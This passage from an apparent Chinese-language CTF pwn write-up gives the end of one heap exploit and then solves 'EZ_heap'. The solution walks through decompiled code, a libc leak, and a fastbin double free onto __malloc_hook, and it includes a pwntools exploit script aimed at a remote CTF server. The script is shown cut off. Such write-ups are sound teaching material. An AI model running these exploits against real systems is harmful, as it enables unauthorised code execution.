+<span class="n">take</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#1  </span>
+<span class="n">take</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s2">"b"</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span><span class="o">+</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x60</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+
+<span class="n">take</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">take</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free</span><span class="p">))</span>
+<span class="n">take</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">one</span><span class="p">))</span>
+<span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">getshell</span><span class="p">()</span>
+</pre></div>
+<p>有关堆的一些入门的学习链接：</p>
+<p><a href="https://www.anquanke.com/post/id/163971#h3-5" target="_blank">CTF pwn 中最通俗易懂的堆入坑指南</a></p>
+<p><a href="https://www.anquanke.com/post/id/86808" target="_blank">how2heap</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction/" target="_blank">ctf-wiki</a></p>
+<p><a href="https://introspelliam.github.io/2017/09/10/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/" target="_blank">Linux堆内存管理深入分析</a></p>
+<p><a href="https://www.freebuf.com/articles/system/151372.html" target="_blank">Dance In Heap</a></p>
+<h1 data-content="1" id="aee13b35b7a45cf9dcd4b27bacb560b6">EZ_heap</h1>
+<p>这题其实见过几次了，hitcon-training的lab12，网鼎杯半决赛线下赛的pwn3，程序逻辑都是一毛一样的，只是题目描述在变而已，也算经典题了吧</p>
+<p>主要利用了double free的漏洞</p>
+<p>来看一下这个保护机制：还是只开了nx和canary</p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>IDA分析：仍然是一个堆题特色的菜单功能</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">init</span><span class="p">();</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="n">add</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="n">check</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="n">del</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+        <span class="n">clean</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"BaiBai~"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>主要有四个功能函数</p>
+<p>add函数，用来创建chunk，一进入该函数就先创建了一个大小为0x28的chunk</p>
+<p>我们给他命名为chunk_init</p>
+<p>接着再由用户指定的size创建chunk</p>
+<p>chunk_init[0]存放了一个标记数，用0和1表示用户的申请的chunk的状态，如果是free状态则为0</p>
+<p>chunk_init[1]存放了用户申请的chunk的指针</p>
+<p>chunk_init[2]存放了一段字符串</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">add</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rsi</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">animalcount</span> <span class="o">&gt;</span> <span class="mh">0x63</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"The cage is overflow"</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Length of the name :"</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Alloca error !!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"The name of animal :"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">v0</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"The kind of the animal :"</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%23s"</span><span class="p">,</span> <span class="n">s</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                                       <span class="c1">// chunk：s</span>
+                                                <span class="c1">// s[0]---&gt;1</span>
+                                                <span class="c1">// s[1]---&gt;buf</span>
+                                                <span class="c1">// s[2]---&gt;kind_of_animal</span>
+                                                <span class="c1">// </span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x63</span><span class="p">;</span> <span class="o">++</span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="o">++</span><span class="n">animalcount</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Successful !"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>check函数的功能就是输出各个chunk的内容了，直接遍历animallist，也就是存放各个chunk_init指针的一个数组</p>
+<p>如果chunk_init指针非空并且chunk_init[0]也就是那个标记数也非空，则打印出chunk_init[1]也就是用户申请的chunk的内容</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">check</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">animalcount</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">animalcount</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0x63</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v0</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="o">**</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Name of the animal[%u] :%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+          <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Kind of the animal[%u] :%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">animallist</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"No animal in the cage !"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>del函数是将用户申请的chunk给free掉，并且将chunk_init[0]的内容修改成0，表示已被删除</p>
+<pre><code>int del()
+{
+  int result; // eax
+  unsigned int v1; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  if ( !animalcount )
+    return puts("No animal in the cage");
+  printf("Which animal do you want to remove from the cage:");
+  __isoc99_scanf("%d", &amp;v1);
+  if ( v1 &lt;= 0x63 &amp;&amp; *(&amp;animallist + v1) )
+  {
+    **(&amp;animallist + v1) = 0;
+    free(*(*(&amp;animallist + v1) + 1));
+    result = puts("Successful");
+  }
+  else
+  {
+    puts("Invalid choice");
+    result = 0;
+  }
+  return result;
+}</code></pre>
+<p>而clean函数则是将chunk_init给free掉并且在animallist中把相应的指针清空</p>
+<p>需要注意的是，必须先执行了del函数，clean函数才能发挥作用，因为有个对chunk_init[0]标志数的检验，只有为0的时候才会执行下面的free操作</p>
+<pre><code>int clean()
+{
+  unsigned int i; // [rsp+Ch] [rbp-4h]
+
+  for ( i = 0; i &lt;= 0x63; ++i )
+  {
+    if ( *(&amp;animallist + i) &amp;&amp; !**(&amp;animallist + i) )
+    {
+      free(*(&amp;animallist + i));
+      *(&amp;animallist + i) = 0LL;
+      --animalcount;
+    }
+
+  }
+  return puts("Done!");
+}</code></pre>
+<p>理清楚上面各个函数的逻辑后，就可以开始着手做题了</p>
+<p>解题的思路如下：</p>
+<ul>
+<li>
+<p>首先通过unsorted_bin，free掉一个chunk，让它进入unsorted_bin表，使得fd指向表头，然后通过泄漏出的地址，通过一顿偏移的操作，泄漏出malloc_hook的地址，进而泄漏出libc的基址</p>
+</li>
+<li>
+<p>利用double-free，使得下一个新创建的chunk会落在malloc_hook上，改变新chunk的内容也就是改变了malloc_hook的内容</p>
+</li>
+<li>
+<p>同时free一个chunk两次，就会触发malloc_printer报错，接着也会调用mallo_hook，如果了malloc_hook的内容为<a href="https://github.com/david942j/one_gadget" target="_blank">onegadget</a>，在报错过程中就会改变程序执行流程进而去执行onegadget，getshell</p>
+</li>
+</ul>
+<p>ps：这里需要注意的是，在构造double-free的时候，需要注意绕过他的检验，使得fd+0x08指向的数值是0x70~0x7f的，fd指向pre_size位，fd+0x08则指向了size位。具体原理可见：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#fastbin-double-free" target="_blank">fastbin-double-free</a></p>
+<p>这题的wp还可以参考hitcon-training的lab12，网上很大佬都写过</p>
+<p>exp</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+<span class="n">bin_elf</span> <span class="o">=</span> <span class="s2">"./supwn6"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">=</span><span class="n">bin_elf</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc64.so"</span><span class="p">)</span>
+<span class="c1">#libc = elf.libc</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"r"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"43.254.3.203"</span><span class="p">,</span><span class="mi">10006</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"l"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="c1">#-------------------------------------</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rc</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sda</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">#-------------------------------------</span>
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">kind</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Length of the name :"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sda</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"The name of animal :"</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"The kind of the animal :"</span><span class="p">,</span><span class="n">kind</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="s2">"2"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Which animal do you want to remove from the cage:"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">clean</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="s2">"4"</span><span class="p">)</span>
+
+
+<span class="c1">#debug()</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="s2">"x"</span><span class="o">*</span><span class="mh">0x08</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="s2">"x"</span><span class="o">*</span><span class="mh">0x08</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">clean</span><span class="p">()</span>
+<span class="c1">#这里需要注意，delet完以后还得clean保证一个character中的两个chunk都被free了</span>
+<span class="c1">#否则下面新创建chunk的时候会导致分配不到跟原先一样的指针</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="s2">"x"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+
+<span class="n">show</span><span class="p">()</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">leak</span><span class="o">-</span><span class="mh">0x58</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">malloc_hook</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"__malloc_hook"</span><span class="p">]</span>
+<span class="n">one</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0xf02a4</span> <span class="c1"># 真实,只能用这个one gadget</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span>
+<span class="c1">#该0x23为调试所得，具体可以在gdb中查看内存找到，能绕过double-free的检测机制即可</span>
+
+<span class="k">print</span> <span class="s2">"libc_base---&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">"leak---&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">"malloc_hook---&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">)</span>
+
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"b"</span><span class="o">*</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">"b"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#4</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"d"</span><span class="o">*</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">"d"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#5</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"ccc"</span><span class="p">,</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#2</span>
